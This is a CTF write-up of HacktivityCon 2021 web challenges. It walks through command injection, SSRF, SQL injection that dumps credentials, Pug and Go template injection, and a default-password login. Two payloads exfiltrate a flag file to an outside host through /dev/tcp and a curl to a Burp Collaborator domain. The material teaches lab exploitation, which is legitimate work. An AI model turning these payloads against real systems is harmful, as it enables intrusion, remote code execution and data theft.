# :globe_with_meridians: Hacktivityconctf 2021 Dd2B03302825

> **Original Source:** [Hacktivityconctf 2021 Dd2B03302825](https://shellbr3ak.medium.com/hacktivityconctf-2021-dd2b03302825)
> **Platform:** shellbr3ak.medium.com | **Category:** `WEB` | **Year:** 2021

---

Hello all, this is shellbreak, and today I’m going to showcase how I solved some web challenges in the hacktivitycon CTF 2021, so without much talking let’s just jump in.


- Swaggy


This challenge was pretty easy, all I had to do is change the server to:


[http://staging-api.congon4tor.com:7777](http://staging-api.congon4tor.com:7777)


and when we click on the /flag request, we’re asked for a username and a password.


so I just tried admin:admin, and indeed it worked.


And we can see the flag in the response body.


2. Confidentiality


This one was had a really easy os command injection vuln. To get the flag all we need to do is to inject:


; CMD


As you can see, inserting a filename as input gets us this response, which apparently tells that “ls -l” command is being executed.


Now let’s try:

>

/etc/hosts;ls


luckily for us, the flag is stored in the same directory of the web application.


so, let’s get it :)

>

/etc/hosts;cat flag.txt


3. Titanic


This challenge had a Server-Side Request Forgery vulnerability which could be exploited to read ‘server-status’ file in order to get the flag.


If you scroll down a little bit, you’ll see


Clicking on “Check out URL capturer” button takes us to this page:


>

payload: [http://localhost/server-status](http://localhost/server-status)


And we get this page


Notice in the logs section, we can see a get request to /admin.php with some creds.


let’s go to admin.php and see if try those creds.


And here’s the result :)


Noice that the creds are reflected into the URL which is a VEEERY bad practice.


4. All Baked Up


This challenge had a GraphQL API, which I had no idea about, so I had to google a lot about, and I honestly asked for hints regarding this one :)


Visiting the given URL takes us to this page:


First I tried intercepting all the requests in this page to see if any of them contains any sensitive data in the request body.


First I clicked on the post with the title of “Strawberry Cake”.


This is how the request looks like:


Now let’s see if other requests has anything of interest.


Clicking on “Grandma’s Yeast Rolls” renders a blank page, which is kinda weird.


Notice that in the response we have a syntax error message. So, here I thought that the single quote in Grandma’s had something to do with it.


let’s investigate further.


putting 2 dashes after the single quote returns nothing.


which indicates a SQLi vulnerability. now let’s try to dump the database to see if we can get anything.


Using this resource: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)


Now we need to extract the tables, but first we need to determine the number of the columns returned from the main request in order to perform a successful UNION based injection attack.


Great, now that we know the main select query (from the backend code) is returing 6 columns, and we see that our input is rendered in the response, it’s time to extract the tables and columns.

>

Query: Grandma’ union select 1,tbl_name,3,4,5,6 FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ —


We see 2 tables, 1 is posts and the other one is users ;)

>

Query: Grandma’ union select 1,sql,3,4,5,6 FROM sqlite_master WHERE type!=’meta’ AND sql NOT NULL AND name =’users’ —


There are 2 columns that seem interesting, (username and password).

>

Query: Grandma’ union select 1,username,3,4,5,6 FROM users —


>

Query: Grandma’ union select 1,password,3,4,5,6 FROM users —


Awesome, now that we have the username and the password we can use these information to get auth tokens to fetch the flag.


Now, while trying to do that, we need to delete all the parameters except the “query” parameter.

>

Query: mutation {\n authenticateUser(password: \”n8bboB!3%vDwiASVgKhv\”, username: \”congon4tor\”) {\n token\n }\n}\n


Yay!! we got the auth token.


Now in order to fetch the flag, we need to add the token in a header called “Authorization” as follows:


And here’s our flag :)


5. Integrity


This challenge is also about OS Command Injection, but it has some restrictions, as we can’t use any of these characters “&|;$()`".


So I went to payloadsallthethings and I saw this one:


Let’s try it out:


In the response we can see the flag being stored in the CWD.


And there it is ;)


Now, I want to mention something here.


I have seen A LOT of people struggling with this challenge, although they’ve used the same payload I did, however they weren’t able to get the flag.


The reason is, they were trying to submit the payload from the web UI, which DOES NOT WORK because, our input there is getting URL-encoded, and since we can’t insert a line break, the “%A” becomes “%250A”, which will be decoded in the backend to “%A”.


So our command will be like:


sha256sum INPUT%ACOMMAND


which as you know, is an invalid command, so in order to do this challenge, using burpsuite is a must.


Now we need to roll up our sleeves as we are about to do some Hard challenges ;)


6. Availability


Now, to be honest, this challenge wasn’t that hard as it seemed.


The only difference between it and Integrity is that the injection vuln in this case is blind.


We are presented a page in which we can submit hostnames/IPs to see if the given host is reachable.


Let’s intercept the request with burp and try some injections :)


Now let’s try injecting a new line feed to see if the bypass from integrity works here.


Response:


We see that the filter is working indeed.


Now let’s try putting a valid command after the new line.

>

Payload: 127.0.0.1%0Aid


Injecting an invalid command gives us this response.

>

Payload: 127.0.0.1%0Asomething


Based up on the previous tests we confirmed that we have a command injection vulnerability.


Now let’s see if we have the flag in the CWD (Current Working Directory).

>

Payload: 127.0.0.1%0Als%20flag.txt


>

Payload: 127.0.0.1%0Als%20doesntexist


Seems like we have the flag in the CWD ;)


Now, we need to exfiltrate the flag by sending it to our VPS.

>

Payload: 127.0.0.1%0Acat%20flag.txt%20>%20/dev/tcp/x.x.x.x/PORT


I tried using port 8081 but I didn’t get the flag which made me think that the box may have some kind of firewall that’s preventing connections to any suspicious ports, so I used port 80 :)


And we got it ;)


7. OPA Secrets


When I first did this challenge I was like, how in hell was this challenge marked as hard Lol (because it took me like less than 10 mins to get the flag) ;P


First we need to register an account.


After logging in, we get this page:


Let’s create a secret (and make sure all our traffic is going through burp proxy).


Now clicking on that little eye button to view our secret submits a post request to an endpoint called /getValue, and the post data is the ID of our secret.


In the security page, we have a github link


So if you visit this link, you’ll see the source code of the app.


In app/app.py file I found the ID of a secret called Flag ;)


let’s try submitting it in the previously mentioned POST request.


Fun fact: As I was doing this challenge, when I saw the ID of the flag I was like, there’s no way this could work, bu eeh, let’s give it a try, and indeed it worked. Then I was told that this is an unintended way :P


But I’m not gonna lie, I was kinda proud that I found it this way ;)


8. Unpugify


When I started this challenge, the first thing I did was googling the title of the page. And I found this:


[https://github.com/pugjs/pug/issues/3312](https://github.com/pugjs/pug/issues/3312)


What caught my attention was this:


So I tried intercepting the request to see if I can control the “pretty” parameter, so I copied the content of the template from the github issue page.


And indeed, we see the pretty parameter :)


Now let’s try that paylaod from the github page.


Response:


In the response, we don’t see anything interesting, so I tried submitting the payload with an empty string as a command.

>

Payload: ‘);process.mainModule.constructor._load(‘child_process’).exec(‘’);_=(‘


And I got this error page.


Here, I knew I was on the right path, but I didn’t know what to do to get the flag. So, I DM’d the creator of the challenge, and he told me that exec() in JS is not syncronous, which means, that the backend app doesn’t wait for my command to finish execution before returning the response. So after googling a bit, I found this:


[https://nodejs.org/api/child_process.html](https://nodejs.org/api/child_process.html)


So, instead of exec(), I used execSync() to get the result I want.


However, I still didn’t get the output of the injected command in the response body, so I used a sleep command to confirm that my exploit is actually working.


You can see that the response took 6 seconds to get returned to me.


Now, it’s time to exfiltrate the flag.

>

Payload: ‘);process.mainModule.constructor._load(‘child_process’).execSync(‘curl+ — data+%40flag.txt+http%3a//vxwxf3xnjg3dd3z54rvj46j0brhh56.burpcollaborator.net’);_=(‘


I used curl command to send the flag in a post request to my burpcollaborator.


And indeed, we got the flag sent to burpcollaborator ;)


9. Go Blog


Among all the challenges I did in this CTF, this was the hardest one.


Actually it was a nightmare to me Lol.


First we’re presented with a login page on which we can either sign in or create a new account. So let’s start by creating an account.


In this challenge we were told that minor content discovery is allowed.


The endpoints I found were:


- /signin

- /signin

- /signup

- /signout

- /admin

- /post

- /profile

- /web/

- /model/


Note: in order to get the last 2 results, you have to tell your fuzzing tool to add a slash to every word from the wordlist.


Visiting the /web/ directory I found a bunch of templates.


In /models/ we can find the source code of the app.


In /profile page, we have a function we can use to change the username.


Giving that the content is generated using templates, it’s fair to try some template injections.


Setting the username to `{{.}}` dumps some data.


Now there’s something to notice here, the dumped data differes based upon the page we’re on.


For instance, in the main page, we see the information of the user `congon4tor`


however, in the `profile` page we see the information of the user we created.


In the profile template:


[http://challenge.ctf.games:31382/web/profile.html.tmpl](http://challenge.ctf.games:31382/web/profile.html.tmpl)


We see that we have an object called `.CurrentUser`


From `users.go` [http://challenge.ctf.games:31382/models/users.go](http://challenge.ctf.games:31382/models/users.go)


We see that we have a struct. Let’s try to view these values by exploiting the template injection we found.


Submitting the following request, renders the user’s email in the username field.


Something extremely important to notice here. The email is only displayed in the `/profile` page. On other pages, we don’t see anything ( and I’ll be talking about that later ).


Here’s an example:


As seen, there’s nothing rendered in the username field, so let’s view the posts template.


We have an object called `Post` which might be the reason why we can’t see the output as what we’ve tried to print here was an attribute that belogs to the `CurrentUser` object.


In [http://challenge.ctf.games:31382/models/posts.go](http://challenge.ctf.games:31382/models/posts.go)


We have a function called GetByID()


which is used in this page: [http://challenge.ctf.games:31382/post/5e6ef653-0f54-4e0b-b9dd-c5898bcfb20a](http://challenge.ctf.games:31382/post/5e6ef653-0f54-4e0b-b9dd-c5898bcfb20a)


Note that after changing our username to `{{.CurrentUser.Email}}` , the `/post/ID` page became empty.


Look back at the function mentioned above,


Notice that the Author object is built off of the User object.


And giving that the main post was written by `congon4tor`


And we also have the posts template


Let’s try something ;)


From the update profile request, let’s change the username to `{{.Post.Author.Email}}`


The profile page and the main page become empty


However, in the `post/ID` page we see something different.


Looks like we can access the information of `congon4tor` but unfortunately we can’t access the password directly.


From [http://challenge.ctf.games:31382/models/users.go](http://challenge.ctf.games:31382/models/users.go) we have a function to change a user’s password.


I know this is confusing so I’ll try to collect all the pieces of the puzzle so you can understand what should be done here.


- We have a template injection vuln.

- We can access the author object which is built off of the User object.

- we know that different functions get executed based up on the page we visit.

- We have a function called ChangePassword which is (sort of) attached to the User object.


The scenario here is, we’re going to exploit the template injection to execute the fuction `ChangePassword` in order to change the password of the user `congon4tor` .


Back when I changed the username to `{{.}}` to discover the template injection vuln, I found that the email is `congo@congon4tor.com` which we’re gonna need to login.


Back to burp, let’s submit another update profile request but this time the payload will be:

>

Payload: {{.Post.Author.ChangePassword “password”}}


NOTE: After submitting the above request, we need to visit the `/post/ID` page


so our ChangePassword function gets executed.


Once that’s done, log out of your session.


And login with these creds:


congo@congon4tor.com:password


And indeed, we did it.


Now let’s visit the `/admin` page to obtain our flag.


And there it is ;P


Well, these were the challenges the managed to solve, I hope you guys enjoyed reading this write up, and in case anyone has any questions pls feel free to reach out:

>

Discord: $hellbr3ak#3712


Finally, I want to thank JohnHammond and Congon4tor for creating these amazing challenges. :)

---

*Originally published on [Medium](https://shellbr3ak.medium.com/hacktivityconctf-2021-dd2b03302825). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
